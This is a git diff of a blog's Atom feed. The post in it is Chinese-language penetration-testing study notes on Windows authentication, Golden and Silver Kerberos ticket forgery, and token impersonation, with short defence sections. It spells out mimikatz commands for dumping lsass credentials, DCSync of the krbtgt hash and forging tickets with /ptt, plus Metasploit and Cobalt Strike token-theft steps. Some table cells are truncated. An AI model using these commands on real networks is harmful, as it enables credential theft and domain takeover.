@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://chriskalix.github.io</id>
     <title>chriskali&apos;s blog</title>
-    <updated>2020-06-17T07:01:29.760Z</updated>
+    <updated>2020-06-17T16:15:23.449Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://chriskalix.github.io"/>
     <link rel="self" href="https://chriskalix.github.io/atom.xml"/>
@@ -33,7 +33,7 @@
 小写转大写 -&gt; 转化为16进制分成2组，填充为14个字符 -&gt; 分成两组7字节的块 -&gt; 每组转化为比特流，不足56Bit在左边加0 -&gt; 将比特流按7比特一组，分出8组，末尾加0</p>
 <h3 id="本地认证流程图">本地认证流程图</h3>
 <img src="D:\个人学习\内网渗透\知识整理\imgs\windows本地认证流程.png" alt="image text" style="zoom: 33%;" />
-<h2 id="2-windows网络认证">2. Windows网络认证</h2>
+<h2 id="2-windows网络认证-中间人攻击还没搞懂">2. Windows网络认证 - 中间人攻击还没搞懂</h2>
 <p>常见服务： SMB服务（端口445）</p>
 <h3 id="ntlm协议">NTLM协议</h3>
 <blockquote>
@@ -112,11 +112,10 @@ kb2871997：<br>
 </blockquote>
 <p>利用krbtgt的HASH值可以伪造生成任意的TGT,能够绕过对任意用户的账号策略，能够让用户成为任意组的成员，可用于Kerberos认证的任何服务。</p>
 <h4 id="前提条件">前提条件</h4>
-<pre><code>域名称
-域SID
-域krbtgt的hash（意味着你已经有域控权限）
-伪造的用户名（任意用户或者不存在的用户）
-</code></pre>
+<p>域名称<br>
+域SID<br>
+域krbtgt的hash（意味着你已经有域控权限）<br>
+伪造的用户名（任意用户或者不存在的用户）</p>
 <h4 id="操作步骤">操作步骤</h4>
 <blockquote>
 <p>使用工具<code>mimikatz</code>(落地有杀软的话基本是杀的死死的，需要找个免杀版本)</p>
@@ -126,6 +125,7 @@ procdump64.exe -accepteula -ma lsass.exe 存放路径\文件名
 mimikatz # sekurlsa::minidump 文件名
 mimikatz # sekurlsa::logonPasswords full
 </code></pre>
+<p>Mimikatz的操作：</p>
 <ol>
 <li>提取域用户krbtgt的NTLM Hash<br>
 <code>lsadump::dcsync /domain:hacker.com /user:krbtgt</code></li>
@@ -137,9 +137,18 @@ mimikatz # sekurlsa::logonPasswords full
 方法一：用AES256生成<br>
 <code>kerber::golden /domain:{域名称} /sid:{sid} /aes256:{AES-256_hmac} /user:{伪造的用户名} /ticket:{名称}.kribi</code><br>
 方法二：用NTLM Hash<br>
-<code>kerber::golden /domain:{域名称} /sid:{sid} krbtgt:ntlm-hashvlaue /user:{伪造的用户名} /ticket:{名称}.kribi</code></li>
+<code>kerber::golden /domain:{域名称} /sid:{sid} /rc4:ntlm-hashvlaue /user:{伪造的用户名} /ticket:{名称}.kribi</code><br>
+在倾旋的视频里是：<br>
+<code>mimikatz &quot;kerberos::golden /domain:{域名} /sid:{域SID} /rc4:{KRBTGT NTLM Hash} /user:{任意用户} /ptt&quot; exit</code></li>
 </ol>
-<h3 id="sliver-ticket白银票据">Sliver Ticket(白银票据)</h3>
+<h4 id="防御">防御</h4>
+<ol>
+<li>经常更换KRBTGT密码</li>
+<li>不允许域管账户登录其他服务器</li>
+</ol>
+<p>Msf的操作：<br>
+用<code>golden_ticket_create</code>生成，在<code>meterpreter</code>里。使用的时候使用kerberos_ticket_use</p>
+<h3 id="silver-ticket白银票据">Silver Ticket(白银票据)</h3>
 <blockquote>
 <p>白银票据(Silver Tickets)是伪造Kerberos票证授予服务（TGS）的票也称为服务票据。所以没有与域控制器通信。这篇<a href="https://www.cnblogs.com/backlion/p/8119013.html">文章</a>挺好的</p>
 </blockquote>
@@ -153,69 +162,92 @@ mimikatz # sekurlsa::logonPasswords full
 <li>任何事件日志都在目标服务器上</li>
 </ol>
 <h4 id="前提条件-2">前提条件</h4>
-<pre><code>域名称
-域的SID
-域中Server服务器账户的NTLM-Hash
-伪造任意的用户名
-</code></pre>
+<p>域名称<br>
+域的SID<br>
+域中Server服务器账户的NTLM-Hash<br>
+伪造任意的用户名</p>
 <h4 id="操作步骤-2">操作步骤</h4>
 <blockquote>
 <p>同样的，老朋友Mimiktaz了</p>
 </blockquote>
+<p>Mimikatz:</p>
+<ul>
+<li>kerberos::list  查看票据</li>
+<li>kerberos::purge 清楚票据</li>
+</ul>
 <ol>
 <li>导出hash<br>
-mimikatz  log  &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot;</li>
-<li>为CIFS服务伪造Sliver Ticket<pre><code>kerberos::purge  清除票据
-kerberos::golden /domain:域名 /sid:SID /target:域全称 /service:要访问的服务  /rc4:NTLM  /user:username /ptt
-1. /domain：域名
-2. /sid：SID值
-3. /target: 域控制器全称
-4. /service: 需要指定相关的服务名，此处为cifs
-5. /rc4: 域控的计算机账户ntlm hash
-6. /user: 要伪造的用户名，任意填写
-为cifs服务创建白银票据，用于访问目标计算机上的任何共享。
+mimikatz log &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot;<br>
+或者 mimiktaz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; log.txt</li>
+<li>生成Sliver Ticket<pre><code>mimikatz &quot;kerberos::golden /domain:{域名} /sid:{域SID} /target:{目标服务器主机名} /service:{服务类型}  /rc4:{NTLM Hash}  /user:{用户名} /ptt&quot; exit
 Silver Ticket 生成时指定了相关的服务名，因此只能用来访问相对应的服务，因此局限性比较大
 </code></pre>
-还有一些其他的服务</li>
-</ol>
+还有一些其他的服务
 <table>
 <thead>
 <tr>
-<th style="text-align:center">服务名称</th>
+<th style="text-align:right">务名称</th>
 <th style="text-align:center">需要的服务</th>
 </tr>
 </thead>
 <tbody>
 <tr>
-<td style="text-align:center">WMI</td>
+<td style="text-align:right">MI</td>
 <td style="text-align:center">HOST、RPCSS</td>
 </tr>
 <tr>
-<td style="text-align:center">PowerShell Remoting</td>
+<td style="text-align:right">owerShell Remoting</td>
 <td style="text-align:center">HOST、HTTP</td>
 </tr>
 <tr>
-<td style="text-align:center">WinRM</td>
+<td style="text-align:right">inRM</td>
 <td style="text-align:center">HOST、HTTP</td>
 </tr>
 <tr>
-<td style="text-align:center">Scheduled Tasks</td>
+<td style="text-align:right">cheduled Tasks</td>
 <td style="text-align:center">HOST</td>
 </tr>
 <tr>
-<td style="text-align:center">Windows File Share</td>
+<td style="text-align:right">indows File Share</td>
 <td style="text-align:center">CIFS</td>
 </tr>
 <tr>
-<td style="text-align:center">LDAP</td>
+<td style="text-align:right">DAP、<strong>DCSync</strong></td>
 <td style="text-align:center">LDAP</td>
 </tr>
 <tr>
-<td style="text-align:center">Windows Remote Server</td>
+<td style="text-align:right">indows Remote Server</td>
 <td style="text-align:center">RPCSS、LDAP、CIFS</td>
 </tr>
 </tbody>
 </table>
+</li>
+</ol>
+<h4 id="针对白银票据的防御">针对白银票据的防御</h4>
+<p>开启PAC特权属性证书保护功能，PAC即是在步骤五收到了请求后，认证Client端发来的PAC(Privileged Attribute Certificate)。开启方式：将注册表中<code>HKEY_LOCAL\MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters</code>中的<code>ValidateKdcPacSignature</code>设置为1</p>
+<h2 id="6-windows-access-token简介">6. Windows Access Token简介</h2>
+<blockquote>
+<p>Windows Token其实叫Access Token(访问令牌)，它是一个描述进程或者线程安全上下文的一个对象。不同用户登录计算机后，都会生成一个Access Token，这个Token在用户创建进程或者线程的时候会被使用，不断的拷贝，这也就解释了A用户创建一个进程而该进程没有B用户的权限</p>
+</blockquote>
+<ul>
+<li>一般情况下，用户双击运行一个程序，都会拷贝 &quot;explorer.exe&quot;的<code>Access Token</code>（问题：explorer.exe）</li>
+<li>Access Token一般分为主令牌和模拟令牌</li>
+<li><strong>当用户注销后，系统将会使主令牌切换为模拟令牌，不会将令牌清除，只有在重启机器后才会清除</strong></li>
+</ul>
+<h3 id="windows-access-token产生过程">Windows Access Token产生过程</h3>
+<p>每个进程创建时都会根据登录绘画权限，由LSA（Local Security Authority）分配一个Token（如果CreateProcess时指定了Token，则会使用该Token，否则用父进程的Token拷贝）</p>
+<h3 id="windows-access-token令牌假冒实战">Windows Access Token令牌假冒实战</h3>
+<ul>
+<li>Incognito(在Metasploit下集成，在meterpreter中直接load进来)<br>
+list_tokens -u<br>
+impersonate_token &quot;xxx\xxx&quot;</li>
+<li>Powershell - Invoke - TokenManipulation.ps1</li>
+<li>Cobalt Strike - steal_token</li>
+</ul>
+<h3 id="防御-2">防御</h3>
+<p>禁止Domain Admins登录对外且未做安全加固的服务器，因为一旦服务器被入侵，域管理员的令牌可能会被攻击者假冒，从而控制DC。想要清楚假冒，重启即可</p>
+<h2 id="7-扩展">7. 扩展</h2>
+<p>SPN扫描(20200618等待扩展ing)</p>
 ]]></content>
     </entry>
     <entry>
